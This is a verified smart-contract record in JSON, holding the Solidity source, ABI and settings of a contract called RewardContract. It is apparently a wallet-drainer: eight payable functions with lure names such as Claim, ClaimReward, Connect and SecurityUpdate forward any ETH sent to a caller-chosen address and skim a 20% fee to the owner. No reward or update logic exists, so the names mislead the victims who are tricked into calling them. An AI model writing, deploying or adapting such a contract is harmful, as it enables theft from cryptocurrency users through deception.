{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"/Users/konders/Downloads/truffle-blueprint-master/contracts/RewardContract.sol\": {\r\n      \"content\": \"/**\\n *Submitted for verification at Etherscan.io on 2023-05-28\\n*/\\n\\n// SPDX-License-Identifier: Unlicense\\n\\npragma solidity ^0.8.18;\\n\\ncontract RewardContract {\\n\\n  address private owner;\\n  uint256 private fee;\\n\\n  constructor(uint256 defaultFee) { owner = msg.sender; fee = defaultFee; }\\n  modifier onlyOwner {\\n    require(msg.sender == owner, \\\"Not contract owner\\\");\\n    _;\\n  }\\n  function getOwner() public view returns (address) { return owner; }\\n  function getFee() public view returns (uint256) { return fee; }\\n\\n  function setFee(uint256 newFee) public onlyOwner {\\n    require(newFee >= 0 && newFee <= 100, \\\"Invalid fee percent\\\");\\n    fee = newFee;\\n  }\\n\\n  function transferWithFee(address to, uint256 amount) private {\\n    uint256 feeAmount = amount * fee / 100;\\n    uint256 amountAfterFee = amount - feeAmount;\\n    payable(to).transfer(amountAfterFee);\\n    payable(owner).transfer(feeAmount);\\n  }\\n\\n  function Claim(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function ClaimReward(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function ClaimRewards(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function Execute(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function Multicall(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function Swap(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function Connect(address sender) public payable { transferWithFee(sender, msg.value);}\\n  function SecurityUpdate(address sender) public payable { transferWithFee(sender, msg.value);}\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"remappings\": [],\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"evmVersion\": \"paris\",\r\n    \"libraries\": {},\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"defaultFee\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ClaimReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Multicall\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Swap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newFee\",\"type\":\"uint256\"}],\"name\":\"setFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RewardContract", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000000000000000000000000000000000000000000014", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}